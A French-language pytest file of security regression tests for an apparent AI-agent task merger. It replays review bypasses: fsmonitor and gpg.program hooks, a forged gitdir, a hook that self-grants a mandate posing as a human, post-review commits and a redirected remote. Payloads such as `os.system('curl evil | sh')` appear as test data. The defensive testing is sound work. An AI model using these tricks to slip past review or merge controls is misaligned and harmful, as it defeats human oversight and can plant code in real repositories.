"""Seconde revue de sécurité de #927 : les contournements démontrés, rejoués contre le merger corrigé.

Chaque test reprend une preuve de concept de la revue (``test_poc2.py``) en affirmant que le contournement n'aboutit
plus : aucun code du worktree exécuté par le tick, aucune fusion d'une tête non relue, aucun chemin hors liste blanche
fusionné sous mandat.
"""

from __future__ import annotations

import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

import pytest
from lot2_doubles import FakeHost, git
from test_merger import (
    advance_main,
    give_ready,
    grant,
    isolate_home,
    launch_and_work,
    make_projet,
    merged_after_review,
    merges,
    review_ready,
    tick,
)

from grimoire.missions.launcher import launched_sessions
from grimoire.missions.mandate import MandateStore
from grimoire.missions.review_seal import SEAL_ENTRY
from grimoire.missions.service import TaskService
from grimoire.missions.task_worktree import MERGED_EVENT


@pytest.fixture(autouse=True)
def _home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    return isolate_home(tmp_path, monkeypatch)


@pytest.fixture
def projet(tmp_path: Path) -> Path:
    return make_projet(tmp_path)


@pytest.fixture
def host() -> FakeHost:
    return FakeHost()


posix_only = pytest.mark.skipif(os.name == "nt", reason="scripts shell exécutables : harnais POSIX")


def _script(path: Path, marker: Path) -> Path:
    path.write_text(f'#!/bin/sh\necho "$PWD" >> {marker}\nprintf "\\0"\n', encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return path


def _merged(projet: Path, tid: str) -> list:  # type: ignore[type-arg]
    return [e for e in TaskService(projet).ledger.events_for(tid) if e.event_type == MERGED_EVENT]


# ── Aucun code du worktree n'est exécuté par le tick ───────────────────────────


@posix_only
def test_un_fsmonitor_pose_dans_la_config_commune_n_est_pas_execute_par_le_tick(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)  # relecteur lancé
    marker = tmp_path / "marker"
    give_ready(host, tid, wt)  # la relecture, dans la session du relecteur (hors du tick)
    git(wt, "config", "core.fsmonitor", str(_script(tmp_path / "fsm.sh", marker)))  # écrit <common>/config
    marker.write_text("", encoding="utf-8")
    report = tick(projet, host)  # le relecteur juge (empreinte, sceau, git status), le merger passe
    tick(projet, host)
    assert marker.read_text(encoding="utf-8") == ""  # neutralisé, sans refuser le dépôt
    assert [(o.action, o.status) for o in report.reviews] == [("ready", "done")]


@posix_only
def test_un_fichier_git_du_worktree_vers_un_dossier_forge_est_refuse(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)
    give_ready(host, tid, wt)
    marker = tmp_path / "marker2"
    real = Path(git(wt, "rev-parse", "--absolute-git-dir"))
    common = Path(git(wt, "rev-parse", "--path-format=absolute", "--git-common-dir"))
    head = git(wt, "rev-parse", "HEAD")
    forged = tmp_path / "forged-gitdir"
    subprocess.run(["git", "init", "-q", "--bare", str(forged)], check=True)
    (forged / "objects/info").mkdir(parents=True, exist_ok=True)
    (forged / "objects/info/alternates").write_text(str(common / "objects") + "\n", encoding="utf-8")
    (forged / "refs/heads/task").mkdir(parents=True, exist_ok=True)
    (forged / "refs/heads/task" / tid).write_text(head + "\n", encoding="utf-8")
    (forged / "HEAD").write_text(f"ref: refs/heads/task/{tid}\n", encoding="utf-8")
    shutil.copy(real / "index", forged / "index")
    (forged / "config").write_text(
        f"[core]\n\tbare = false\n\trepositoryformatversion = 0\n\tfsmonitor = {_script(tmp_path / 'fsm2.sh', marker)}\n",
        encoding="utf-8")
    (wt / ".git").write_text(f"gitdir: {forged}\n", encoding="utf-8")
    marker.write_text("", encoding="utf-8")
    report = tick(projet, host)
    tick(projet, host)
    assert marker.read_text(encoding="utf-8") == ""
    assert [(o.action, o.status) for o in report.reviews] == [("refused", "failed")]
    assert "n'est pas un worktree du dépôt du projet" in report.reviews[0].detail and host.of("gh", "pr", "merge") == []


@posix_only
def test_un_fsmonitor_qui_s_accorde_un_mandat_ne_tourne_jamais(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)
    forge = tmp_path / "forge.py"
    forge.write_text(
        "import sys\n"
        f"sys.path[:0] = {[p for p in sys.path if p]!r}\n"
        "from pathlib import Path\n"
        "from grimoire.missions.mandate import ORIGIN_HUMAN, MandateRequest, MandateStore\n"
        f"s = MandateStore(Path({str(projet)!r}))\n"
        "if not s.state().active:\n"
        "    s.grant(MandateRequest.build(('merge','accept'), ('implementation',), 5, '+1d'), origin=ORIGIN_HUMAN, via='forgé')\n",
        encoding="utf-8")
    sh = tmp_path / "fsm3.sh"
    sh.write_text(f'#!/bin/sh\n{sys.executable} {forge} >/dev/null 2>&1\nprintf "\\0"\n', encoding="utf-8")
    sh.chmod(0o755)
    give_ready(host, tid, wt)
    git(wt, "config", "core.fsmonitor", str(sh))
    for _ in range(5):
        tick(projet, host)
    assert not MandateStore(projet).state().active and host.of("gh", "pr", "merge") == []


@posix_only
def test_un_gpg_program_de_la_config_commune_n_est_pas_execute(projet: Path, host: FakeHost, tmp_path: Path) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    review_ready(projet, host, tid, wt)
    marker = tmp_path / "gpg-marker"
    sh = tmp_path / "gpg.sh"
    sh.write_text(f'#!/bin/sh\necho gpg >> {marker}\nexit 1\n', encoding="utf-8")
    sh.chmod(0o755)
    git(wt, "config", "gpg.program", str(sh))
    git(wt, "config", "commit.gpgsign", "true")
    advance_main(projet, "autre.txt", "main avance\n")
    report = tick(projet, host)
    assert not marker.exists()  # commit-tree du réalignement, sans signature
    assert merges(report) == [("realign", "done")]


# ── Chemins : une liste blanche, comparée en casefold ──────────────────────────

BYPASS = [
    "src/grimoire/hosts/decisions/tool_policy.py",
    "src/grimoire/core/standard_checks/tree_fingerprint.py",
    "src/grimoire/core/fsio.py",
    "src/grimoire/missions/task_worktree.py",
    "src/grimoire/flows/attestation.py",
    "src/grimoire/missions/questions.py",
    "src/grimoire/missions/service.py",
    "pyproject.toml",
    ".github/hooks/post.json",
    ".github/actions/setup/action.yml",
    ".gitattributes",
    ".gitmodules",
    "conftest.py",
    "tests/unit/conftest.py",
    "src/grimoire/missions/__pycache__/mandate.cpython-312.pyc",
    "src/app/__pycache__/x.cpython-312.pyc",
    "src/app/evil.pth",
    "src/app/sitecustomize.py",
    "SRC/grimoire/missions/mandate.py",
    "src/grimoire/missions/Mandate.py",
    "src/grimoire/missions/mandate.PY",
    "src/app/build/_native.cpython-312-x86_64-linux-gnu.so",
]


@pytest.mark.parametrize("path", BYPASS)
def test_un_chemin_protege_n_est_jamais_fusionne_sous_mandat(projet: Path, host: FakeHost, path: str) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=(path, "x = 1\n"))
    report = merged_after_review(projet, host, tid, wt)
    assert merges(report) == [("escalate", "done")], (path, [o.detail for o in report.merges])
    assert "reviennent à l'humain" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []


# ── Le sceau porte sur la tête git, pas sur l'empreinte ────────────────────────

BLIND = [
    "pkg/node_modules/evil.py", "pkg/target/evil.py", "src/grimoire/__pycache__/evil.cpython-312.pyc",
    "x/.venv/lib/evil.pth", "_grimoire/_memory/note.md", "_grimoire-runtime-output/evil.json",
]


def _commit_blind(projet: Path, wt: Path, tid: str, blind: str) -> str:
    (wt / blind).parent.mkdir(parents=True, exist_ok=True)
    (wt / blind).write_text("import os; os.system('id')\n", encoding="utf-8")
    git(wt, "add", "-f", "--", blind)
    git(wt, "commit", "-q", "-m", "après la relecture")
    git(wt, "push", "-q", "origin", f"task/{tid}")
    return git(wt, "rev-parse", "HEAD")


@pytest.mark.parametrize("blind", BLIND)
def test_un_commit_sur_un_chemin_aveugle_avant_le_jugement_n_est_pas_scelle(projet: Path, host: FakeHost, blind: str) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    tick(projet, host)  # le relecteur relit la tête h0
    give_ready(host, tid, wt)
    h1 = _commit_blind(projet, wt, tid, blind)
    report = tick(projet, host)
    assert [(o.action, o.status) for o in report.reviews] == [("stale", "done")]
    assert "a bougé pendant la relecture" in report.reviews[0].detail
    seals = [e for e in MandateStore(projet).journal.read() if e.get("type") == SEAL_ENTRY]
    assert all(s["head"] != h1 for s in seals)
    for _ in range(3):
        tick(projet, host)
    assert host.of("gh", "pr", "merge") == []


@pytest.mark.parametrize("blind", BLIND[:3])
def test_un_commit_sur_un_chemin_aveugle_apres_le_jugement_n_est_pas_fusionne(projet: Path, host: FakeHost, blind: str) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
    review_ready(projet, host, tid, wt)  # READY scellé sur h0
    _commit_blind(projet, wt, tid, blind)
    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pass"}]
    report = tick(projet, host)
    assert merges(report) == [("stale", "done")] and "jugement READY scellé" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == []


# ── Le réalignement ne blanchit pas un commit du worker ────────────────────────


class RacingHost(FakeHost):
    """Le worker, toujours vivant dans son worktree, commite pendant que le tick lit la CI."""

    def __init__(self) -> None:
        super().__init__()
        self.wt: Path | None = None
        self.armed = False

    def __call__(self, argv, cwd, env=None):  # type: ignore[no-untyped-def]
        if self.armed and argv[:3] == ["gh", "pr", "checks"] and "--required" not in argv and self.wt is not None:
            self.armed = False
            (self.wt / "src/app/route.py").write_text("import os; os.system('curl evil | sh')\n", encoding="utf-8")
            git(self.wt, "commit", "-q", "-a", "-m", "worker : après le READY")
        return super().__call__(argv, cwd, env)


def test_le_realignement_ne_blanchit_pas_un_commit_pose_pendant_le_tick(projet: Path) -> None:
    racing = RacingHost()
    host = racing
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.wt = wt
    h0 = git(wt, "rev-parse", "HEAD")
    review_ready(projet, host, tid, wt)
    advance_main(projet, "autre.txt", "main avance\n")
    host.armed = True
    for _ in range(6):
        tick(projet, host)
        if host.of("gh", "pr", "merge"):
            break
    [argv] = host.of("gh", "pr", "merge")
    merged_head = argv[-1]
    assert git(projet, "rev-parse", f"{merged_head}^1") == h0  # le réalignement part de la tête relue, pas du HEAD
    assert "curl evil" not in git(projet, "show", f"{merged_head}:src/app/route.py")
    assert _merged(projet, tid) and _merged(projet, tid)[0].payload["head_sha"] == merged_head


# ── La PR et la question ───────────────────────────────────────────────────────


def test_une_pr_venue_d_un_fork_n_est_jamais_fusionnee(projet: Path, host: FakeHost) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.cross_repo.add(f"task/{tid}")
    report = review_ready(projet, host, tid, wt)
    assert merges(report) == [("refused", "refused")] and "autre dépôt" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == []


def test_la_question_echappe_ce_que_la_pr_controle(projet: Path, host: FakeHost) -> None:
    from grimoire.missions.questions import records_of

    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=(".github/\x1b[31mrouge`<b>x</b>`.yml", "x\n"))
    merged_after_review(projet, host, tid, wt)
    [question] = [r.question for r in records_of(TaskService(projet).require(tid))]
    assert "\x1b" not in question.text and "<b>" not in question.text and "rouge" in question.text


# ── Troisième revue : GitHub fait foi, jamais une ref ou une URL locale ────────


class RealRemoteHost(FakeHost):
    """gh fictif qui parle toujours à la vraie remote (GitHub), quoi que dise la configuration locale du worker."""

    def _merge(self, argv, cwd):  # type: ignore[no-untyped-def]
        assert self.real is not None
        return super()._merge(argv, cwd)


def _evil_remote(tmp_path: Path, real: Path, head: str) -> Path:
    evil = tmp_path / "evil.git"
    subprocess.run(["git", "clone", "-q", "--bare", str(real), str(evil)], check=True)
    git(evil, "update-ref", "refs/heads/main", head)  # sa main est la tête du worker : un diff base...tête vide
    return evil


PROTECTED = "src/grimoire/missions/guards.py"


def test_une_url_de_origin_redirigee_ne_fait_ni_recuperer_ni_fusionner(projet: Path, tmp_path: Path) -> None:
    host = RealRemoteHost()
    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=(PROTECTED, "import os\nos.system('id')\n"))
    evil = _evil_remote(tmp_path, host.real, git(wt, "rev-parse", "HEAD"))  # type: ignore[arg-type]
    git(wt, "config", "--local", "remote.origin.url", str(evil))
    outcomes = list(merged_after_review(projet, host, tid, wt).merges)
    for _ in range(2):
        outcomes += tick(projet, host).merges
    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
    assert any(PROTECTED in o.detail or "n'est pas le dépôt de la PR" in o.detail for o in outcomes), outcomes


def test_une_ref_de_suivi_plantee_ne_cache_aucun_chemin(projet: Path, tmp_path: Path) -> None:
    host = RealRemoteHost()
    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=(PROTECTED, "import os\nos.system('id')\n"))
    head = git(wt, "rev-parse", "HEAD")
    git(wt, "config", "--local", "remote.origin.fetch", "+refs/heads/zzz:refs/remotes/origin/zzz")
    git(wt, "update-ref", "refs/remotes/origin/main", head)  # la « cible » locale ment : le diff local serait vide
    report = merged_after_review(projet, host, tid, wt)
    assert merges(report) == [("escalate", "done")] and PROTECTED in report.merges[0].detail  # la liste vient de GitHub
    assert host.of("gh", "pr", "merge") == []


def test_temoin_un_chemin_protege_sans_manipulation_n_est_pas_fusionne(projet: Path) -> None:
    host = RealRemoteHost()
    grant(projet)
    tid, wt = launch_and_work(projet, host, edit=(PROTECTED, "x = 1\n"))
    report = merged_after_review(projet, host, tid, wt)
    assert merges(report) == [("escalate", "done")] and host.of("gh", "pr", "merge") == []


@pytest.mark.parametrize("redirect", [False, True])
def test_le_noyau_du_kit_escalade_a_l_humain(projet: Path, tmp_path: Path, redirect: bool) -> None:
    """La preuve de concept de la troisième revue, sur son chemin d'origine : `src/grimoire/core/*` n'est jamais fusionné."""
    host = RealRemoteHost()
    grant(projet)
    path = "src/grimoire/core/guards.py"
    tid, wt = launch_and_work(projet, host, edit=(path, "import os\nos.system('id')\n"))
    if redirect:
        evil = _evil_remote(tmp_path, host.real, git(wt, "rev-parse", "HEAD"))  # type: ignore[arg-type]
        git(wt, "config", "--local", "remote.origin.url", str(evil))
    outcomes = list(merged_after_review(projet, host, tid, wt).merges)
    for _ in range(2):
        outcomes += tick(projet, host).merges
    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
    expected = "n'est pas le dépôt de la PR" if redirect else path  # redirigée : rien n'est récupéré, donc rien fusionné
    assert any(o.action in ("escalate", "refused") and expected in o.detail for o in outcomes), outcomes


def test_une_liste_de_fichiers_incomplete_n_est_pas_fusionnee(projet: Path, host: FakeHost) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    host.changed_files[f"task/{tid}"] = 250  # GitHub tronque la liste : ce qui n'est pas listé n'est pas vérifié
    report = merged_after_review(projet, host, tid, wt)
    assert merges(report) == [("escalate", "done")] and "liste incomplète" in report.merges[0].detail


# ── Troisième revue : l'usage ordinaire ne casse pas ───────────────────────────


@pytest.mark.parametrize("key, value", [
    ("user.signingkey", "ABC"), ("commit.template", "x"), ("core.hooksPath", ".husky"),
    ("filter.lfs.clean", "git-lfs clean -- %f"), ("remote.origin.pushurl", ""), ("core.sparseCheckout", "true"),
    ("push.followTags", "true"), ("rebase.autoStash", "true"), ("core.editor", "vim"),
])
def test_une_configuration_ordinaire_ne_bloque_pas_le_lanceur(projet: Path, host: FakeHost, key: str, value: str) -> None:
    git(projet, "config", key, value or git(projet, "remote", "get-url", "origin"))
    tid, _wt = launch_and_work(projet, host)
    assert tid in launched_sessions(TaskService(projet))


def test_le_durcissement_ne_change_pas_l_empreinte_des_recus(projet: Path, tmp_path: Path) -> None:
    """Gitignore global, diff.algorithm et filtre LFS globaux : la même empreinte dans le tick et hors du tick."""
    from grimoire.core.safe_git import tick_scope
    from grimoire.core.standard_checks.tree_fingerprint import compute_tree_fingerprint

    home = Path(os.environ["HOME"])
    (home / "ignore-global").write_text("settings.local.json\n", encoding="utf-8")
    (home / ".gitconfig").write_text(
        f"[core]\n\texcludesFile = {home / 'ignore-global'}\n[diff]\n\talgorithm = histogram\n"
        "[filter \"lfs\"]\n\tclean = cat\n\tsmudge = cat\n\trequired = false\n", encoding="utf-8")
    (projet / "settings.local.json").write_text("{}\n", encoding="utf-8")
    (projet / "notes.txt").write_text("brouillon\n", encoding="utf-8")
    before = [compute_tree_fingerprint(projet, include_toolchain=False, content_only=c) for c in (True, False)]
    with tick_scope(projet, active=True):
        during = [compute_tree_fingerprint(projet, include_toolchain=False, content_only=c) for c in (True, False)]
    assert before == during


def test_hors_d_un_role_autonome_le_tick_ne_touche_pas_a_git(projet: Path, host: FakeHost) -> None:
    from grimoire.missions import orchestrate

    write = projet / "_grimoire/standard/orchestration-policy.yaml"
    write.write_text("orchestrator:\n  roles:\n    worker:\n      enabled: false\n", encoding="utf-8")
    seen: list[str | None] = []
    before = os.environ.get("GIT_CONFIG_COUNT")
    real = orchestrate._one_pass

    def spy(*args, **kwargs):  # type: ignore[no-untyped-def]
        seen.append(os.environ.get("GIT_CONFIG_COUNT"))
        return real(*args, **kwargs)

    import pytest as _pytest

    with _pytest.MonkeyPatch.context() as mp:
        mp.setattr(orchestrate, "_one_pass", spy)
        service = TaskService(projet)
        mission = service.ledger.create_mission(title="L", origin="test")
        service.ledger.create_task(mission.id, "t", acceptance=("a",), owner="amelia")
        tick(projet, host)
    assert seen == [before]  # aucune neutralisation posée : les git du kit sont ceux de toujours


def _launch_one(root: Path) -> bool:
    from lot2_doubles import FakeHost as Host

    from grimoire.missions.orchestrate import run_tick
    from grimoire.missions.schemas import TaskState

    service = TaskService(root)
    mission = service.ledger.create_mission(title="L", origin="test")
    task = service.ledger.create_task(mission.id, "t", acceptance=("a",), owner="amelia")
    service.ledger.transition_task(task.id, TaskState.READY)
    run_tick(root, apply=True, exec_=Host())
    return task.id in launched_sessions(TaskService(root))


def test_un_projet_dans_un_sous_dossier_du_depot_lance_encore(tmp_path: Path) -> None:
    from lot2_doubles import make_repo
    from test_launcher import write_policy as worker_policy

    mono = make_repo(tmp_path)
    sub = mono / "apps" / "web"
    sub.mkdir(parents=True)
    worker_policy(sub)
    (mono / ".gitignore").write_text("_grimoire-output/\n_grimoire-runtime-output/\n_grimoire/\n", encoding="utf-8")
    git(mono, "add", "--", ".gitignore")
    git(mono, "commit", "-q", "-m", "sous-dossier")
    git(mono, "push", "-q", "origin", "main")
    assert _launch_one(sub)


def test_un_projet_lui_meme_worktree_lie_lance_encore(tmp_path: Path) -> None:
    from lot2_doubles import make_repo
    from test_launcher import write_policy as worker_policy

    root = make_repo(tmp_path)
    linked = tmp_path / "wt-projet"
    git(root, "worktree", "add", "-q", "-b", "feat", str(linked))
    worker_policy(linked)
    assert _launch_one(linked)


def test_une_remote_qui_ne_dit_pas_ce_que_dit_github_fait_attendre(projet: Path, host: FakeHost) -> None:
    grant(projet)
    tid, wt = launch_and_work(projet, host)
    branch = f"task/{tid}"
    host.checks[branch] = [{"name": "tests", "bucket": "pending"}]
    review_ready(projet, host, tid, wt)
    host.pr_heads[branch] = git(wt, "rev-parse", "HEAD")  # GitHub annonce la tête relue…
    (wt / "src/app/route.py").write_text("autre chose\n", encoding="utf-8")
    git(wt, "commit", "-q", "-am", "poussé, pas encore vu par GitHub")
    git(wt, "push", "-q", "origin", branch)  # … la remote est déjà ailleurs
    host.checks[branch] = [{"name": "tests", "bucket": "pass"}]
    tick(projet, host)
    report = tick(projet, host)
    assert merges(report) == [("wait", "waiting")] and "ne disent pas encore la même chose" in report.merges[0].detail
    assert host.of("gh", "pr", "merge") == []
